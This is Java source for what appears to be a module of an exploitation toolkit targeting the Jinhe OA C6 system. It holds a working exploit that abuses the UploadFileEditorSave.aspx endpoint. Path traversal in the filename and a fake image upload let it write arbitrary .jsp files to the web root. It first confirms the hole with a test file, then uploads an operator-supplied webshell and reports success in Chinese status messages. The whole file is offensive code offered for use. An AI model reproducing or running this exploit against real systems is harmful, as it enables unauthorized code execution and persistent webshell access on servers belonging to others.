package exp.oa.jinheoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.io.File;
import java.util.Date;
import java.util.HashMap;

public class jinhe_uploadfileeditorsave_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String uploadfileeditorsave(String url,String filename,String content){
        HashMap head = new HashMap();
        head.put("Content-Type","multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b");
        String postData = "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"FileBlod\"; filename=\"1.jpg\"\r\n" +
                "Content-Type: image/png\r\n" +
                "\r\n" +
                content+
                "\r\n" +
                "--59229605f98b8cf290a7b8908b34616b--";
        Response res = HttpTools.post(url+"/C6/Control/UploadFileEditorSave.aspx?filename=\\....\\....\\C6\\"+filename,postData,head,"utf-8");
        if(res.getCode()==200 && res.getText().contains(content.substring(0,2))){
            Response res1 = HttpTools.get(url+"/c6/"+filename,new HashMap<>(),"utf-8");
            if(res1.getCode()==200){
                return url+"/c6/"+filename;
            }
        }
        return null;
    }

    private Boolean att(String url,TextArea textArea) {
        try {
//            String shell_payload = shell.readFile(shell.Jsppath);
            long t = (new Date()).getTime();
            String filename = t+".jsp";
            String payload = "Hello R4g";
            String result = uploadfileeditorsave(url,filename,payload);


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ jinhe_uploadfileeditorsave_upload ]");
                    Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url,String pass, TextArea textArea,TextArea textArea_cmd) {
        try {


            String shell_payload = Methods.readFile(pass);
            long tt = (new Date()).getTime();
            String filename = "R4g"+tt+(new File(pass)).getName().substring((new File(pass)).getName().indexOf("."));
            String payload = tt+"\n" + shell_payload;
            String result = uploadfileeditorsave(url,filename,payload);


            if ( result != null) {
                Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: "+result+"----"+get.getText());
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }
        return false;
    }
}
